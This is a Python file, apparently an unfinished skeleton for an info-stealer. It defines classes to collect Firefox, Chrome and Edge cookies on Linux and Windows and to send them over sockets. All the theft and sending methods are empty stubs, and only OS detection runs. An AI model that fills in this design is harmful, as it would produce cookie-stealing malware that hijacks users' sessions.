from abc import ABC, abstractmethod
import os, socket, platform;


# * Operating System Detector
class OSInterface(ABC):
    @abstractmethod
    def DetectOperatingSystem(self):
        pass


class OSDetector(OSInterface):
    def DetectOperatingSystem(self):
        return platform.system();







# * Classes to obtain Browser Cookies
class BrowserCookiesGetter(ABC):

    @abstractmethod
    def GetCookiesInLinux(self, username):
        pass

    @abstractmethod
    def GetCookiesInWindows(self, username):
        pass

class FirefoxCookiesGetter(BrowserCookiesGetter):

    def __init__(self): 
        pass

    def GetCookiesInLinux(self, username):
        pass

    def GetCookiesInWindows(self, username):
        pass


class ChromeCookiesGetter(BrowserCookiesGetter):
    def __init__(self): 
        pass


    def GetCookies(self):
        pass



class EdgeCookiesGetter(BrowserCookiesGetter):

    def __init__(self): 
        pass

    def GetCookies(self):
        pass


# * Classes to send Browser Cookies with Sockets
class SocketSender(ABC):

    @abstractmethod
    def Send(ip, port):
        pass

    
class SendCookies(SocketSender):

    def __init__(self):
        pass

    def Send(self):
        pass








def Main():

    detector = OSDetector();

    os = detector.DetectOperatingSystem()

    print(os)





if __name__ == "__main__":
    Main()
